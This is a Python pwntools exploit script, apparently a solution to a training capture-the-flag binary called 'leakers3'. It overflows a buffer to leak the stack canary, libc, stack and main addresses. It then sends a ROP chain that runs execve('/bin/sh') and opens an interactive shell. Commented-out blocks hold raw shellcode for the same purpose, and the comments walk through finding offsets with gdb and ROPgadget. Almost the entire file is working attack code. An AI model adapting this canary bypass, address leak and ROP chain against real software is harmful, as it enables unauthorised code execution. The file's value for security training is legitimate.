from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

import time

#r = process("./leakers3") 
r = remote("bin.training.jinblack.it", 2012)


'''
gdb.attach(r, """
	#brva 0xa13
	#brva 0xa45
	brva 0xa6a
	c
""")
'''

binsh = b"/bin/sh\x00"

payload = binsh 
r.send(payload)
time.sleep(1)

#payload = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaac'
payload = b"B" * 105
r.send(payload)
time.sleep(1)

r.recvuntil(b"> ")
r.recv(105)
canary = u64(b"\x00" + r.recv(7))
#print("canary: " + "%#x" % canary)

payload_to_leak_libc = b"C" * (104 + 2*8)
r.send(payload_to_leak_libc)
time.sleep(1)

r.recvuntil(b"> ")
r.recv(104 + 2*8)
leak_libc = u64(r.recv(6) + b"\x00" * 2)
#print("address of leak_libc: " + "%#x" % leak_libc)

# if you want to find this offset, you need to look in gdb with: vmmap leak_libc
offset_libc_cane = 0x21c87
base_libc = leak_libc - offset_libc_cane
#print("address of base_libc: " + "%#x" % base_libc)

# i am not going to use a shellcode on a buffer, so it's not really
# useful to leak the stack, but it's a good exercise
payload_to_leak_the_stack = b"C" * (104 + 4*8)
r.send(payload_to_leak_the_stack)
time.sleep(1)

r.recvuntil(b"> ")
r.recv(104 + 4*8)
stack = u64(r.recv(6) + b"\x00" * 2)
#print("address on the stack: " + "%#x" % stack)

payload_to_leak_the_main = b"C" * (104 + 6*8)
r.send(payload_to_leak_the_main)
time.sleep(1)

r.recvuntil(b"> ")
r.recv(104 + 6*8)
main_b = r.recv(6) + b"\x00" * 2
main = u64(main_b)
offset_main = 0x960
offset_protection = main - offset_main
#print("offset : " + "%#x" % offset_protection)
#print("address on main: " + "%#x" % main)

delta_read = 0xa45
read_position = offset_protection + delta_read

pop_rdi = offset_protection + 0xb23
pop_rsi_15 = offset_protection + 0xb21
#print("pop_rdi : " + "%#x" % pop_rdi)
#print("pop_rsi_15 : " + "%#x" % pop_rsi_15)

# How LTI and GOT works:
# if you are interested in the delta for printf because you want to leak libc, you can use ghidra or type 
# objdump -D ./leakers3 | grep printf
# notice that if you take the address on the left you will need to look twice in the memory, while if 
# you take the one on the right you will once. I will take the one on the left.
# delta_printf = 0xa94
# then you go in gdb and type vmmap, which is 0x555555554000 locally
# then you sum it with the previous delta and look for it in the memory:
# x/i 0x555555554a94 and it will leak the address of plt printf, but not the one in libc -> 0x5555555547d0
# x/x 0x5555555547d0 and it will leak the address of GOT for the printf: 0x555555755028
# a double check to see if this last address is got is to check if it is pointing to the next instruction of the previous address (0x5555555547d6),
# before the real address is computed.
# notice that if we put a breakpoint before the printf and then one after, it will get populated. So, the got will change.
# the address of printf on libs (so the address in the got section) is: 0xf7a46e40
# in the same way we can obtain the address of puts in libc: 0xf7a62970
# However I am not going to follow this solution because I dkw it doesn't patch the library 


# if you want to find exceve_offset in libc, you need to download the right library (notice that 64 bit matter) and do:
# patchelf --set-interpreter ./ld-2.27.so --replace-needed libc.so.6 ./libc-2.27.so ./leakers3
# to change both the interpreter and the libc
# then you can check it with ldd leakers3
# finally, you can go to a terminal, type ipython and type also:
# LIBC = ELF("./libc-2.27.so")
# system = LIBC.symbols["execve"]
# hex(system)
# which will be equal to '0xe4e30'

exceve_offset = 0xe4e30
exceve = exceve_offset + base_libc
#print("address of exceve: " + "%#x" % exceve)

syscall_offset = 0x000d2625
syscall = syscall_offset + base_libc
#print("address of syscall: " + "%#x" % syscall)

# to find gadgets:
# ROPgadget --binary ./library_name | egrep "pop rdx"
offset_pop_rdx_libc = 0x1b96  
pop_rdx_libc = base_libc + offset_pop_rdx_libc
#print("pop_rdx_libc: " + "%#x" % pop_rdx_libc)

offset_pop_rax_libc = 0x439b8 
pop_rax_libc = base_libc + offset_pop_rax_libc
#print("pop_rax_libc: " + "%#x" % pop_rax_libc)

# 0x158 looking at the memory in gdb with x/60gx $rsp
# we need to start from buffer + 2 becuause to exit the loop we need "/n"
buffer_ = stack - 0x158 + 2
#print("buffer: " + "%#x" % buffer_)

# with ghex library
# look for the string: /bin/sh
binsh_offset_libc = 0x1b3e9a
binsh_libc = base_libc + binsh_offset_libc

# ps1 is in the section bss which should not be randomized by aslr
# looking in ghidra the offset from the bss base is 0x20
# however we don't have a real leak of bss, but we can exploit the one from main 
# notice that if you compute "info files" in gdb, it gives back the sections
# the base of bcc starts from 0x555555755060 and the leak is 0x555555554960
# 0x555555755060 - 0x555555554960 = 0x200100
offset_main_bss = 0x200700
offset_bss_ps1 = 0x20
ps1 = main + offset_main_bss + offset_bss_ps1
#print("ps1: " + "%#x" % ps1)

payload = b"C" * 2 + binsh + b"D" * (102 - len(binsh)) + p64(canary) + b"D"*8 + p64(pop_rdi) + p64(ps1) + p64(pop_rsi_15) + p64(0) + p64(0) + p64(pop_rdx_libc) + p64(0) + p64(pop_rax_libc)+ p64(0x3b)+ p64(syscall)

r.send(payload)
time.sleep(1)

payload = b"\n"
r.send(payload)
time.sleep(1)


#LIBC = ELF("./libc-2.27.so")
#system = LIBC.symbols["execve"]
# hex(system) = '0xe4e30'


'''
payload = b"D" * 104 + p64(canary) + b"D"*8 + p64(main)
r.send(payload)
time.sleep(1)

payload = b"D" * 104 + p64(canary) + b"D"*8 + p64(pop_rdi) + p64(0) + p64(pop_rsi_15) + p64(stack) + p64(0) + p64(read_position)#b"E"*8
r.send(payload)
time.sleep(1)

shellcode = b"\x90\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00\x00"
shellcode = shellcode.ljust(104, b"\x90")

payload = shellcode + p64(canary) + b"D"*8 + p64(ps1)
r.send(payload)

time.sleep(1)
'''

'''

address = buffer_position
payload = shellcode + p64(canary) + b"D"*8 + p64(address)
r.send(payload)

time.sleep(1)

r.send(b"\n")
'''



r.interactive()
input("wait")

